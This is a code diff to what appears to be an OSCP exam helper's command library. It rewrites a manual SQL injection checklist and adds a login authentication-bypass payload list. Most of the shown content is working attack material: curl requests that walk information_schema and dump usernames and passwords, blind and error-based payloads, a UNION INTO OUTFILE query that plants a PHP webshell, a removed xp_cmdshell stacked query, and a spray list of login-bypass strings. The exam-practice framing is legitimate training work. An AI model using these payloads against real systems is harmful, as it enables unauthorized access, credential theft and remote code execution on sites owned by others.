@@ -230,52 +230,86 @@ mv report.pdf OSCP-OS-XXXXX-Exam-Report.pdf
 md5sum OSCP-OS-XXXXX-Exam-Report.7z` },
 
 // ============ WEB — EXAM-SAFE (LOTL substitutes) ============
-{ id:'manual-sqli', cat:'Web — exam-safe (sqlmap substitute)', name:'Manual SQL injection checklist (LOTL — no sqlmap)', lang:'bash',
-  desc:'Hand-driven SQLi: detect, then confirm via UNION / error / boolean / time, extract, and escalate to RCE — the OSCP-safe path when automated exploitation is off-limits.',
-  when:'A parameter reflects into a SQL query and exam rules forbid sqlmap (automated exploitation). Work each stage by hand with curl or the browser so every request is deliberate and documented.',
-  where:'Run from KALI against the web target (or through your proxy). Nothing runs on the target until the RCE stage, which you trigger manually.',
-  how:'Go top to bottom. Confirm the injection class first (a single quote that breaks the page = candidate). Pick ONE technique that works, extract, then only attempt RCE where the DB engine and privileges allow it. Capture the request and response for every finding.',
+{ id:'manual-sqli', cat:'Web — exam-safe (sqlmap substitute)', name:'Manual SQLi — detect, navigate the DB, extract, RCE (no sqlmap)', lang:'bash',
+  desc:'Hand-driven SQLi against a reflected query parameter (e.g. page.php?id=1): detect the flaw, fingerprint the engine, walk the database (databases → tables → columns → rows), extract creds, and — only where privileges allow — escalate to RCE. Pick your DB engine in the builder to get the right dialect. The OSCP-safe path when sqlmap is off-limits.',
+  when:'A URL/query parameter reflects into a SQL query and exam rules forbid sqlmap. Attacking a login FORM instead? Use the "SQLi login / auth bypass" checklist below — this one is for enumerating and looting a database through an injectable parameter.',
+  where:'Run from KALI against the web target (curl, or replay in Burp). Nothing runs on the target until the RCE stage, which you fire by hand.',
+  how:'Set the engine, endpoint path, and parameter in the builder, then toggle the stages you need. Work top to bottom: confirm the injection (a quote that breaks the page, or a true-vs-false page difference), get the column count with ORDER BY, then UNION to fingerprint and walk information_schema. Extract, then attempt RCE only where the engine + privileges allow. Capture the request and response for every finding.',
   code:
-`# 0) Detect — does a quote break it, and does the logic respond?
+`# Default dialect below is MySQL/MariaDB — switch engine in the builder for MSSQL/PostgreSQL.
+# ---- STAGE 0 · Detect (does a quote break it, does the logic respond?) ----
 curl -s "http://{{target}}/page.php?id=1'"                 # error / 500 / changed page = candidate
-curl -s "http://{{target}}/page.php?id=1 AND 1=1 -- -"      # true  -> normal page
-curl -s "http://{{target}}/page.php?id=1 AND 1=2 -- -"      # false -> different/empty page
+curl -s "http://{{target}}/page.php?id=1 AND 1=1 -- -"     # true  -> normal page
+curl -s "http://{{target}}/page.php?id=1 AND 1=2 -- -"     # false -> different/empty page
 
-# 1) Column count (increment until it stops erroring):
-curl -s "http://{{target}}/page.php?id=1 ORDER BY 1 -- -"
-# ...ORDER BY 2, 3, ... last working number = column count
+# ---- STAGE 1 · Column count (ORDER BY until it errors) ----
+curl -s "http://{{target}}/page.php?id=1 ORDER BY 1 -- -"  # bump 2,3,... last that works = column count
 
-# 2) UNION — find which columns echo (N = column count):
-curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,2,3 -- -"
-curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,@@version,3 -- -"
-curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,current_user(),database() -- -"
+# ---- STAGE 2 · UNION foothold + fingerprint (N = column count) ----
+curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,2,3 -- -"                 # which columns echo?
+curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,@@version,database() -- -" # engine + current DB
+curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,current_user(),3 -- -"     # current user
 
-# 3) Enumerate schema via information_schema:
+# ---- STAGE 3 · Navigate the database (schemas -> tables -> columns) ----
+curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata -- -"
 curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -"
 curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' -- -"
+
+# ---- STAGE 4 · Extract (dump the rows you want) ----
 curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users -- -"
 
-# 4) Error-based (UNION blocked, MySQL):
-curl -s "http://{{target}}/page.php?id=1 AND extractvalue(1,concat(0x7e,(SELECT database()))) -- -"
+# ---- STAGE 5 · No UNION? error / blind fallbacks ----
+curl -s "http://{{target}}/page.php?id=1 AND extractvalue(1,concat(0x7e,(SELECT database()))) -- -"        # error-based (leaks in the error)
+curl -s "http://{{target}}/page.php?id=1 AND substring((SELECT database()),1,1)='a' -- -"                 # blind boolean (char by char)
+curl -s "http://{{target}}/page.php?id=1 AND IF(substring((SELECT database()),1,1)='a',sleep(3),0) -- -"  # blind time (3s delay = true)
 
-# 5) Blind boolean (nothing echoed) — compare true vs false page char by char:
-curl -s "http://{{target}}/page.php?id=1 AND substring((SELECT database()),1,1)='a' -- -"
-
-# 6) Blind time-based (no boolean tell):
-curl -s "http://{{target}}/page.php?id=1 AND IF(substring((SELECT database()),1,1)='a',sleep(3),0) -- -"                 # MySQL
-curl -s "http://{{target}}/page.php?id=1; IF (ASCII(SUBSTRING((SELECT DB_NAME()),1,1))=97) WAITFOR DELAY '0:0:3' -- -"  # MSSQL
-
-# 7) Manual RCE (only where DB + privileges allow — the --os-shell equivalent):
-# MySQL FILE priv -> write a webshell into the webroot:
-curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,'<?php system($_GET[0]);?>',3 INTO OUTFILE '/var/www/html/s.php' -- -"
-curl -s "http://{{target}}/s.php?0=id"
-# MSSQL sysadmin -> enable + use xp_cmdshell (stacked query):
-curl -s "http://{{target}}/page.php?id=1; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami' -- -"
+# ---- STAGE 6 · RCE (only where DB + privileges allow — the --os-shell equivalent) ----
+curl -s "http://{{target}}/page.php?id=-1 UNION SELECT 1,'<?php system($_GET[0]);?>',3 INTO OUTFILE '/var/www/html/s.php' -- -"  # needs FILE priv + known webroot
+curl -s "http://{{target}}/s.php?0=id"                     # run commands through the written webshell
 
 # Evidence to capture per stage: the exact request, the true/false response diff,
-# extracted data, and — for RCE — the command output in the response.`,
+# extracted rows, and — for RCE — the command output echoed in the response.`,
   execMode:'kali', examSafe:true, substitutesFor:['sqlmap'],
-  examSafeReason:'Every request is issued by hand (curl/browser), so it performs no automated exploitation — the OSCP-permitted alternative to sqlmap.' },
+  examSafeReason:'Every request is issued by hand (curl / browser / Burp), so it performs no automated exploitation — the OSCP-permitted alternative to sqlmap.' },
+
+{ id:'sqli-login', cat:'Web — exam-safe (login auth bypass)', name:'SQLi login / auth bypass checklist (fuzz a login form)', lang:'bash',
+  desc:'A ready-to-fuzz list of authentication-bypass payloads for a username/password login form — log in without valid credentials when the login query is not parameterized. The common "there is a login page" case, formatted as a checklist you paste through the browser, Burp, or curl.',
+  when:'A web app shows a username/password login and you suspect the credentials go straight into a SQL query (a single quote in the username throws an error or a 500, or it is a lab/exam web box). Attacking a reflected URL parameter instead? Use the "Manual SQLi" tool above.',
+  where:'Run from KALI — type payloads into the form in the browser, replay the login POST in Burp Repeater/Intruder, or send it with curl. Nothing executes on the target; you are only submitting form values.',
+  how:'Put a payload in the USERNAME field and anything in the password, then submit. A success looks like a redirect to a dashboard, a Set-Cookie session, an authenticated page, or a response length clearly different from the "invalid credentials" baseline. If one comment style fails, try the next (-- - then # then /* */). Use Burp Intruder to spray the whole list at once and sort by status/length.',
+  code:
+`# Paste a payload into the USERNAME field (password = anything). Watch for a login
+# success: a redirect, a Set-Cookie session, an authenticated page, or a response
+# length different from the "invalid credentials" baseline.
+
+# ---- Log in as the FIRST user (usually admin) ----
+admin' -- -
+admin' #
+administrator' -- -
+' OR 1=1 -- -
+' OR 1=1 LIMIT 1 -- -
+
+# ---- OR-true (when the username is not matched against a real row) ----
+' OR '1'='1' -- -
+' OR '1'='1
+" OR "1"="1" -- -
+') OR ('1'='1' -- -
+admin') -- -
+
+# ---- Replay the login POST with curl (adjust field names + endpoint) ----
+curl -s -i -X POST "http://{{target}}/login.php" \\
+  --data-urlencode "username=admin' -- -" \\
+  --data-urlencode "password=x"
+
+# ---- Spray the whole list with Burp Intruder ----
+# Send the login request to Intruder, mark ONLY the username value as the payload
+# position, load these strings as a Simple list, then sort results by status / length
+# to spot the one that logged in.
+
+# Not injectable here if EVERY payload returns the same "invalid credentials" length —
+# try the password field, a different comment style, or move to parameter-based SQLi.`,
+  execMode:'kali', examSafe:true, substitutesFor:[],
+  examSafeReason:'Payloads are submitted by hand through the browser, Burp, or curl — manual testing with no automated exploitation tool.' },
 
 // ============ ENUMERATION — LOTL ============
 { id:'portsweep-bash', cat:'Enumeration — exam-safe (nmap substitute)', name:'Bash /dev/tcp port + host sweep (no nmap on target)', lang:'bash',
